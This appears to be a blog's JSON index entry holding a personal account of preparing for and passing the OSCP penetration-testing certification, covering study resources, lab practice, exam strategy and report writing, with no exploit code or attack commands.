Analysis"},{"content":"Introduction to \u0026ldquo;trying harder\u0026rdquo; How it all started When I was 14 years old, I was amazed by how hackers could do something which seems impossible to an average non-IT person. After some googling and researching, I found out about OSCP certification and after reading bunch of reviews and experience stories about it, it seemed impossible for me to obtain it. I got so scared that I forgot about it completely and started learning web development. Three years of web development later, when the 2019 was coming to an end, I wanted to set a goal for \u0026ldquo;New Year\u0026rsquo;s Resolutions\u0026rdquo; and I thought of that \u0026ldquo;scary\u0026rdquo; certification - OSCP. Since COVID-19 breakout caused global lockdowns, I had all the time in the world to study for it.\n My \u0026ldquo;not so good\u0026rdquo; approach When I officially started, 1st of january 2020, I didn\u0026rsquo;t know basic UNIX shell commands. I was so noob that I thought cat command meant the literal house cat and I was like \u0026ldquo;what the f*** is this all about? A cat in the command line?\u0026rdquo;. The first thing that I had to learn is how to use basic shell commands and how to navigate the system, learn how files and directories are organized in both Linux and Windows. I obviously had 0 experience with any of pentesting stuff. Luckily I had some understanding of networking and programming.\nAfter the basics After learning the basics of command line, the next logical step for me is to get out there and do things! I remember trying to do Traverxec box on HackTheBox pentesting platform with very little success. It took me 15 days to root it, even though the initial foothold was Metasploit module for RCE and privilege escalation was simple sudo command. The whole get out there and do things was very bad approach because it involved me googling for hours and hours just to find out how that one thing is called.\nThe real progress I started seeing progress after regularly watching Ippsec\u0026rsquo;s videos on retired HackTheBox machines. To replicate his videos, I had to purchase monthly VIP subscription on HackTheBox which really paid off. I was so obsessed with pwning retired boxes that I sometimes forgot to eat.\nOf course, I took notes while watching Ippsec\u0026rsquo;s videos, I didn\u0026rsquo;t figure out those boxes by myself. I did not want to waste time googling stuff that I can easily watch being explained by Ippsec. I watched one of his videos every single day, following TJ Null\u0026rsquo;s OSCP-like boxes list and taking notes on what stuff can be exploited, what to search for when I see X port open.\nQuickly after, I developed my own methodology which was mostly based on his, with little adjustments which suited me better. You probably won\u0026rsquo;t succeed without self-explanatory and detailed notes.\nHow I took notes I used a free software called Joplin which is available on all kinds of devices, for free!. Joplin is a markdown editor which has built-in backup feature. I connected it to my dropbox account and voila! Free notes!\nBeginning of PWK After 6 months of watching Ippsec\u0026rsquo;s walkthroughs, I finally decided to purchase 90-day lab period. After cashing out $1350, I felt really scared because at the time, that was all of my savings, I even had to sell my phone and downgrade just to do PWK. My lab time started on 20th of june 2020 at 2am. I couldn\u0026rsquo;t sleep that night, all I did was browsing around the student forums and learning how to use the PWK Labs control panel. On the second day, I started reading the PDF and watching videos.\nThe mistakes I made Going through the material, I immediately started doing the exercices and documenting them until I burned out from all the studying. It felt like I wasn\u0026rsquo;t making progress, like I was stuck and the depression jumped in. I quickly abandoned the PDF and videos and jumped straight into labs - BUT YOU SHOULD NOT DO THE SAME!. That was the dumbest thing I ever did, because I had to refer back to the PDF every time I got stuck on a machine which cost me a lot of precious lab time.\nSecond mistake that I made was not communicating with others. I didn\u0026rsquo;t have any contacts to discuss about anything related to penetration testing and I felt like I was alone at it. The community is very supportive and go out and make as much as pentesting friends as possible! Sharing experiences and knowledge is what makes pentesting fun.\nBuffer overflow - how? PWK module for buffer overflow didn\u0026rsquo;t do much for me, not because it is bad, but because it only gave me 2 examples on how to exploit the vulnerability. I needed more throrough explanation so I saw on r/oscp that everyone recommended The Cyber Mentor\u0026rsquo;s Buffer Overflows Made Easy playlist. That playlist is a gold mine of BoF resources and explanations. He did a very good job making it as simple as possible and I recommend everyone to watch it.\nAfter learning basic BoF, I moved on to some non-PWK labs to practice it even further. I stumbled upon TryHackMe Buffer overflow prep room which had 10 unique binaries to exploit. THIS IS ALL YOU NEED FOR PWK BOF!!!\nThe labs I could not do any of the lab machines on my own, and I had to rely on hints from student forums. Which seems like bad thing to do, but it worked for me. All I needed at the time was the experience in popping shells and knowing what attack vectors are possible, because I didn\u0026rsquo;t know some of them even existed. If I hadn\u0026rsquo;t checked the forums for hints, I would\u0026rsquo;ve probably wasted so much lab time googling the stuff I had in front of my eyes. BUT the important thing is that after looking at the hints, I did not just move on, but I looked at it deeper and researched about why does that vulnerability occur and how to exploit it.\nCouple of days later, I caught COVID-19 and couldn\u0026rsquo;t leave my house for a month because of the quarantine. I used all of that time to study and root boxes in the lab because what else could I do? Schools and everything else was closed, even the lockdown got much more strict, which is why I had so much time to invest into labs.\nAfter some time, I managed to move between the departments and eventually I rooted whole PWK labs, having almost 2 months left to do exercices and finish PDF. I felt ready for the exam, but I did not want to schedule it 2 months earlier! So I sat down and started doing boring exercices. Exercices were the most difficult thing on PWK! They required you to google a lot, to think out of the box and sometimes you don\u0026rsquo;t know what is the goal of the exercice and get confused. After a month, I finally managed to finish the lab report documenting 10 lab machines, step by step, and all required exercices. I remember finding on r/oscp a checklist of all required exercices and you should too!. Don\u0026rsquo;t get me wrong, exercices were very useful, and those 10 lab boxes which you had to document are the best practice for final exam report. At the end, it was worth it.\nExternal labs Not knowing what else to do, I bought a subscription on CyberSecLabs which paid off! They don\u0026rsquo;t have the same difficult boxes as for example, HackTheBox, but they teach you a vast majority of misconfigurations and common vulnerabilities which were left out from PWK labs. Their boxes we\u0026rsquo;re usually very easy, but still a good practice and confidence boost right before the exam!\n The Exam I scheduled my exam for 15th of september 2020 at 12pm. That time worked the best for me, but it might not do well for you. The night before the exam, I could barely sleep. I had to take melatonin just to stop my thoughts and fall asleep.\nAfter I woke up, I realized that I didn\u0026rsquo;t have a camera which is required so the proctor can see and identify you. I panicked but I managed to get one from my friend. Before the exam started, I sat down and made a strategy for next 23 hours and 45 minutes.\nThe strategy Before the exam, I opened up my two main cheatsheets I commonly browsed, full of useful info, and of course, my own notes from PWK labs which I cannot share for obvious reasons. Those are the links:\n Sushant747 gitbook Hacktricks book  I used NmapAutomator to scan all boxes except BoF one. While I did the BoF, results came back for all other boxes saving me some time. I used tmux to make multiple windows, and ran nmapautomator on all of the boxes.\nMy strategy was to take a 15 minute break every 2 hours or after every time I get root.\nWorkflow of the exam I first jumped right into the BoF box, where they give you the debug machine to test your payload. I managed to do it in 35 minutes, taking screenshots while following the cheatsheet at noobsec. After getting first 25pts I felt VERY motivated thinking that I\u0026rsquo;ll finish the exam very soon.\nAfter BoF machine, I took a break for 15 minutes and started my 2 hour timer, while examining enumeration results of 25pt box. After examining the results, I had no idea what to do! I felt very scared because I really wanted to do the hardest one first. I didn\u0026rsquo;t know what I was looking at, I felt the same way that I felt when I did my first ever box, Traverxec.\nAfter 2 hours, the timer rang and I had to move on to another box, wasting 2 hours googling the stuff I haven\u0026rsquo;t even heard about, without much success. I moved on to 20pt box, which I owned in 4 hours. It wasn\u0026rsquo;t straighforward at all, full of rabbit holes.\nAfter rooting the box, I knew that I had 55 points, 8 hours in. Not bad. I had to choose between going back to 25pt box or doing 10pt + 20pt. I didn\u0026rsquo;t want to reply on my lab report to pass. I moved on to 20pt box, examining the results and not finding anything for next 4 hours. I felt very scared and stressed that I tried to sleep, but I couldn\u0026rsquo;t! The adrenaline was rushing through me and I couldn\u0026rsquo;t even close my eyes. I knew I had to try harder.\nWithout anything on 20pt box, I moved on to 10pt one where I quickly found the way to exploit but for some reason I just couldn\u0026rsquo;t! I used my metasploit allowance which did not help me. That box was very frustrating and I had to ask offsec staff to verify if it is exploitable or not, and after 2 hours they said that it is working properly.\n16 hours in, still at 55 points without any progression. I decided to go for a walk and come back after half an hour. I came back to 25pt box and caught myself doing all the same things that I did the first time tackling it, so I stopped and thought \u0026ldquo;Why don\u0026rsquo;t I do something else?\u0026rdquo; and I started thinking out of the box. Soon I realized what I\u0026rsquo;ve been missing, and found initial foothold which was very tricky to get working. 2 hours later, I finally got user on 25pt box. But still it was not enough to pass, so I tried harder.\nAfter 2 hours of enumerating the 25pt box internally, I found out what I needed. It took me an hour to get exploit to work, and I got code execution as root user but I could\u0026rsquo;t replicate it again. It took me some troubleshooting to get it working again. I was at 70 points + lab report. I knew that I have enough points to pass and I shouted \u0026ldquo;YEEEEEAAAAAHHH\u0026rdquo; as loud as I could. Because of all the adrenaline and happiness coming out of me, I told myself why not try those 2 remaining boxes? And I managed to root both of them in 1 hour, ending the exam after 23 hours.\nReport day After I ended the exam, I took a nap and dreamed of me failing which was the worst nightmare I\u0026rsquo;ve ever had. After waking up I realized it was just a dream and that I have 105 points in reality! Such an amazing feeling.\nWhile doing the boxes, I screenshotted everything I could, maybe I did it too much, but it is better to over-do it than under-do it. For report, I followed John Hammond\u0026rsquo;s tutorial on note taking and report generating which you can see here. Markdown made it much easier and much faster to write a report. My report consisted of 60 pages, where I explained everything with as much detail as I could.\nOffsec is strict when it comes to reports - you must know what you did on the exam. You need to explain it. If you aren\u0026rsquo;t native english speaker, like me, don\u0026rsquo;t worry, they don\u0026rsquo;t mind some grammar mistakes but you should know the basics of english.\nI finished my report after 6 hours, read it couple of times before submitting and waiting for the results.\n The results This email brought me so much happiness knowing that I achieved something I worked really hard for 9 months! I successfully completed the goal for 2020!\nOne month after, I finally received the physical certificate\nThank you! I want to thank all the people I mentioned above! Without them and their content creation, this wouldn\u0026rsquo;t be possible! Now going for OSWE :)\n","permalink":"https://lazarpostenje.github.io/posts/my-oscp-experience/","summary":"Introduction to \u0026ldquo;trying harder\u0026rdquo; How it all started When I was 14 years old, I was amazed by how hackers could do something which seems impossible to an average non-IT person. After some googling and researching, I found out about OSCP certification and after reading bunch of reviews and experience stories about it, it seemed impossible for me to obtain it. I got so scared that I forgot about it completely and started learning web development.","title":"My OSCP Experience"}]